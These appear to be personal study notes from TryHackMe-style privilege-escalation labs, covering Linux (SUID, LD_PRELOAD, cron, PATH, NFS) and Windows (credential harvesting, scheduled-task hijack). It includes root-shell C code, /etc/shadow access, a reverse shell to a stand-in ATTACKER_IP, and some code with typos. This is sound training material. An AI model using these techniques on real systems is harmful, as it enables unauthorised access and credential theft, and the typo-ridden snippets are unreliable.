<ul>
<li><code>find . -name flag1.txt</code>: find the file named “flag1.txt” in the current directory</li>
<li><code>find /home -name flag1.txt</code>: find the file names “flag1.txt” in the &#x2F;home directory</li>
<li><code>find / -type d -name config</code>: find the directory named config under “&#x2F;”</li>
<li><code>find / -type f -perm 0777</code>: find files with the 777 permissions (files readable, writable, and executable by all users)</li>
<li><code>find / -perm a=x</code>: find executable files</li>
<li><code>find /home -user frank</code>: find all files for user “frank” under “&#x2F;home”</li>
<li><code>find / -mtime 10</code>: find files that were modified in the last 10 days</li>
<li><code>find / -atime 10</code>: find files that were accessed in the last 10 day</li>
<li><code>find / -cmin -60</code>: find files changed within the last hour (60 minutes)</li>
<li><code>find / -amin -60</code>: find files accesses within the last hour (60 minutes)</li>
<li><code>find / -size 50M</code>: find files with a 50 MB size</li>
</ul>
<p>This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -size +100M</span><br><span class="line">find / -size +100M -type f&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>Folders and files that can be written to or executed from:</p>
<ul>
<li><code>find / -writable -type d 2&gt;/dev/null</code> : Find world-writeable folders</li>
<li><code>find / -perm -222 -type d 2&gt;/dev/null</code>: Find world-writeable folders</li>
<li><code>find / -perm -o w -type d 2&gt;/dev/null</code>: Find world-writeable folders</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul>
<li><strong>LinPeas</strong>: <a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li>
<li><strong>LinEnum:</strong> <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
<li><strong>LES (Linux Exploit Suggester):</strong> <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
<li><strong>Linux Smart Enumeration:</strong> <a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
<li><strong>Linux Priv Checker:</strong> <a target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li>
</ul>
<h3 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h3><p>Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.</p>
<p>Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.</p>
<p>The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.</p>
<p>The Kernel exploit methodology is simple;</p>
<ol>
<li>Identify the kernel version</li>
<li>Search and find an exploit code for the kernel version of the target system</li>
<li>Run the exploit</li>
</ol>
<p>Although it looks simple, please remember that <strong>a failed kernel exploit can lead to a system crash</strong>. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.</p>
<p><strong>Researh sources:</strong></p>
<ol>
<li>Based on your findings, you can use Google to search for an existing exploit code.</li>
<li>Sources such as <a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/cves">https://www.linuxkernelcves.com/cves</a> can also be useful.</li>
<li>Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).</li>
</ol>
<p><strong>Hints&#x2F;Notes:</strong></p>
<ol>
<li>Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit</li>
<li>Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.</li>
<li>Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.</li>
<li>You can transfer the exploit code from your machine to the target system using the <code>SimpleHTTPServer</code> Python module and <code>wget</code> respectively.</li>
</ol>
<h3 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h3><p>The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive</span><br></pre></td></tr></table></figure>

<p>Any user can check its current situation related to root privileges using the <code>sudo -l</code> command.</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.</p>
<p><strong>Leverage application functions</strong></p>
<p>Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.</p>
<p>In this case, we can use a “hack” to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (<code>-f</code> : specify an alternate ServerConfigFile).</p>
<p>Loading the <code>/etc/shadow</code> file using this option will result in an error message that includes the first line of the <code>/etc/shadow</code> file.</p>
<p><strong>Leverage LD_PRELOAD</strong></p>
<p>On some systems, you may see the LD_PRELOAD environment option.</p>
<p>LD_PRELOAD is a function that allows any program to use shared libraries. This <a target="_blank" rel="noopener" href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">blog post</a> will give you an idea about the capabilities of LD_PRELOAD. If the “env_keep” option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.</p>
<p>The steps of this privilege escalation vector can be summarized as follows;</p>
<ol>
<li>Check for LD_PRELOAD (with the env_keep option)</li>
<li>Write a simple C code compiled as a share object (.so extension) file</li>
<li>Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file</li>
</ol>
<p>The C code will simply spawn a root shell and can be written as follows;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line">sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</span><br></pre></td></tr></table></figure>

<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.</p>
<p>You will notice these files have an “s” bit set showing their special permission level.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br><span class="line">//List files that have SUID or SGID bits set.</span><br></pre></td></tr></table></figure>

<p>The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the <code>/etc/shadow</code> file or adding our user to <code>/etc/passwd</code>.</p>
<p>Below are simple steps using both vectors.</p>
<p>reading the <code>/etc/shadow</code> file</p>
<p>We see that the nano text editor has the SUID bit set by running the <code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> command.</p>
<p><code>nano /etc/shadow</code> will print the contents of the <code>/etc/shadow</code> file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the <code>/etc/shadow</code> and <code>/etc/passwd</code> files.</p>
<p>With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit <a target="_blank" rel="noopener" href="https://tryhackme.com/room/johntheripper0">https://tryhackme.com/room/johntheripper0</a></p>
<p>The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:</p>
<p>We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">we can use base64 to read file</span><br><span class="line">such as </span><br><span class="line">base64 yake.txt | base64 --decode</span><br></pre></td></tr></table></figure>

<h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.<br>The capabilities man page provides detailed information on its usage and options.</p>
<p>We can use the <code>getcap</code> tool to list enabled capabilities.</p>
<p>When run as an unprivileged user, <code>getcap -r /</code> will generate a huge amount of errors, so it is good practice to redirect the error messages to &#x2F;dev&#x2F;null.</p>
<p>Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.</p>
<p>GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / &gt;/dev/null</span><br><span class="line">ls -l /usr/bin/vim</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p>
<h3 id="Cron-Jobs"><a href="#Cron-Jobs" class="headerlink" title="Cron Jobs"></a>Cron Jobs</h3><p>Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.<br>The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.</p>
<p>Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.</p>
<p>Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.</p>
<p>Any user can read the file keeping system-wide cron jobs under <code>/etc/crontab</code></p>
<p>While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.</p>
<p>Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:</p>
<ol>
<li>System administrators need to run a script at regular intervals.</li>
<li>They create a cron job to do this</li>
<li>After a while, the script becomes useless, and they delete it</li>
<li>They do not clean the relevant cron job</li>
</ol>
<p>This change management issue leads to a potential exploit leveraging cron jobs.</p>
<p>In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. <strong>For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.</strong></p>
<h3 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h3><p>If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>

<p>If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.</p>
<ol>
<li>What folders are located under $PATH</li>
<li>Does your current user have write privileges for any of these folders?</li>
<li>Can you modify $PATH?</li>
<li>Is there a script&#x2F;application you can start that will be affected by this vulnerability?</li>
</ol>
<p>A simple search for writable folders can done using the “<code>find / -writable 2&gt;/dev/null</code>” command. The output of this command can be cleaned using a simple cut and sort sequence.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br><span class="line">//We have added “grep -v proc” to get rid of the many results related to running processes.</span><br><span class="line">find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</span><br></pre></td></tr></table></figure>

<p>example : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ehco $PATH</span><br><span class="line">find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</span><br><span class="line">ls -lah /home/murdoch</span><br><span class="line">//find test is executable file</span><br><span class="line">//./test we can find &quot;can not find thm&quot;  so we touch thm </span><br><span class="line"></span><br><span class="line">thm.py :</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setgid(0);</span><br><span class="line">	setudi(0);</span><br><span class="line">	system(&quot;/bin/bash&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cd /home/murdoch</span><br><span class="line">touch thm </span><br><span class="line">ehco &quot;/bin/bash&quot; &gt; thm</span><br><span class="line">chmod +x thm</span><br><span class="line">export PATH=/home/murdoch:$PATH</span><br><span class="line">./test</span><br></pre></td></tr></table></figure>

<h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><p>Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.</p>
<p>Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.</p>
<p>NFS (Network File Sharing) configuration is kept in the &#x2F;etc&#x2F;exports file. This file is created during the NFS server installation and can usually be read by users.</p>
<p>The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.</p>
<p>We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.</p>
<p>As we can set SUID bits, a simple executable that will run &#x2F;bin&#x2F;bash on the target system will do the job.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()L</span><br><span class="line">&#123;</span><br><span class="line">   setgid(0);</span><br><span class="line">   setuid(0);</span><br><span class="line">   system(&quot;/bin/bash&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>example : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports            ///home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)</span><br><span class="line"></span><br><span class="line">showmount -e 10.10.242.200</span><br><span class="line">mkdir /tmp/sharedfolder</span><br><span class="line">mount -o rw 10.10.242.200:/home/ubuntu/sharedfolder  /tmp/sharedfolder</span><br><span class="line"></span><br><span class="line">touch main.c         //the code listed above</span><br><span class="line">gcc main.c -o pwned -w</span><br><span class="line">cp pwned /tmp/sharedfolder</span><br><span class="line">sudo chown root:root /tmp/sharedfolder/pwned</span><br><span class="line">sudo chmod +s /tmp/sharedfolder/pwned</span><br><span class="line"></span><br><span class="line">./pwned </span><br></pre></td></tr></table></figure>



<h1 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h1><h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h3><p>Simply put, privilege escalation consists of using given access to a host with “user A” and leveraging it to gain access to “user B” by abusing a weakness in the target system. While we will usually want “user B” to have administrative rights, there might be situations where we’ll need to escalate into other unprivileged accounts before actually getting administrative privileges.</p>
<p>Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won’t always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:</p>
<ul>
<li>Misconfigurations on Windows services or scheduled tasks</li>
<li>Excessive privileges assigned to our account</li>
<li>Vulnerable software</li>
<li>Missing Windows security patches</li>
</ul>
<p>Before jumping into the actual techniques, let’s look at the different account types on a Windows system.</p>
<p><strong>Windows Users</strong></p>
<p>Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Administrators</strong></td>
<td>These users have the most privileges. They can change any system configuration parameter and access any file in the system.</td>
</tr>
<tr>
<td><strong>Standard Users</strong></td>
<td>These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.</td>
</tr>
</tbody></table>
<p>Any user with administrative privileges will be part of the <strong>Administrators</strong> group. On the other hand, standard users are part of the <strong>Users</strong> group.</p>
<p>In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:</p>
<table>
<thead>
<tr>
<th><strong>SYSTEM &#x2F; LocalSystem</strong></th>
<th>An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Local Service</strong></td>
<td>Default account used to run Windows services with “minimum” privileges. It will use anonymous connections over the network.</td>
</tr>
<tr>
<td><strong>Network Service</strong></td>
<td>Default account used to run Windows services with “minimum” privileges. It will use the computer credentials to authenticate through the network.</td>
</tr>
</tbody></table>
<p>These accounts are created and managed by Windows, and you won’t be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.</p>
<h3 id="Harvesting-Passwords-from-Usual-Spots"><a href="#Harvesting-Passwords-from-Usual-Spots" class="headerlink" title="Harvesting Passwords from Usual Spots"></a>Harvesting Passwords from Usual Spots</h3><p>The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.</p>
<p>This task will present some known places to look for passwords on a Windows system.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:wade /p:parzival /v:10.10.167.18</span><br></pre></td></tr></table></figure>

<h5 id="Unattended-Windows-Installations"><a href="#Unattended-Windows-Installations" class="headerlink" title="Unattended Windows Installations"></a>Unattended Windows Installations</h5><p>When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don’t require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
</ul>
<p>As part of these files, you might encounter credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Credentials&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">    &lt;Domain&gt;thm.local&lt;/Domain&gt;</span><br><span class="line">    &lt;Password&gt;MyPassword123&lt;/Password&gt;</span><br><span class="line">&lt;/Credentials&gt;</span><br></pre></td></tr></table></figure>



<h5 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h5><p>Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a <code>cmd.exe</code> prompt:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> The command above will only work from cmd.exe, as Powershell won’t recognize <code>%userprofile%</code> as an environment variable. To read the file from Powershell, you’d have to replace <code>%userprofile%</code> with <code>$Env:userprofile</code>. </p>
<h5 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h5><p>Windows allows us to use other users’ credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<p>While you can’t see the actual passwords, if you notice any credentials worth trying, you can use them with the <code>runas</code> command and the <code>/savecred</code> option, as seen below.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>



<h5 id="IIS-Configuration"><a href="#IIS-Configuration" class="headerlink" title="IIS Configuration"></a>IIS Configuration</h5><p>Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called <code>web.config</code> and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:</p>
<ul>
<li>C:\inetpub\wwwroot\web.config</li>
<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
</ul>
<p>Here is a quick way to find database connection strings on the file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>



<h5 id="Retrieve-Credentials-from-Software-PuTTY"><a href="#Retrieve-Credentials-from-Software-PuTTY" class="headerlink" title="Retrieve Credentials from Software: PuTTY"></a>Retrieve Credentials from Software: PuTTY</h5><p>PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection’s parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won’t allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.</p>
<p>To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.</p>
<p>Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.</p>
<h3 id="Other-Quick-Wins"><a href="#Other-Quick-Wins" class="headerlink" title="Other Quick Wins"></a>Other Quick Wins</h3><p>Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.</p>
<h5 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h5><p>Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it’s using a binary you can modify.</p>
<p>Scheduled tasks can be listed from the command line using the <code>schtasks</code> command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn vulntask /fo list /v</span><br><span class="line">Folder: \</span><br><span class="line">HostName:                             THM-PC1</span><br><span class="line">TaskName:                             \vulntask</span><br><span class="line">Task To Run:                          C:\tasks\schtask.bat</span><br><span class="line">Run As User:                          taskusr1</span><br></pre></td></tr></table></figure>

<p>You will get lots of information about the task, but what matters for us is the “Task to Run” parameter which indicates what gets executed by the scheduled task, and the “Run As User” parameter, which shows the user that will be used to execute the task.</p>
<p>If our current user can modify or overwrite the “Task to Run” executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use <code>icacls</code>:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls c:\tasks\schtask.bat</span><br><span class="line">c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                    BUILTIN\Administrators:(I)(F)</span><br><span class="line">                    BUILTIN\Users:(I)(F)</span><br></pre></td></tr></table></figure>

<p>As can be seen in the result, the <strong>BUILTIN\Users</strong> group has full access (F) over the task’s binary. This means we can modify the .bat file and insert any payload we like. For your convenience, <code>nc64.exe</code> can be found on <code>C:\tools</code>. Let’s change the bat file to spawn a reverse shell:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p>We then start a listener on the attacker machine on the same port we indicated on our reverse shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn’t be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /run /tn vulntask</span><br></pre></td></tr></table></figure>

<p>And you will receive the reverse shell with taskusr1 privileges as expected:</p>
<p>Kali Linux</p>
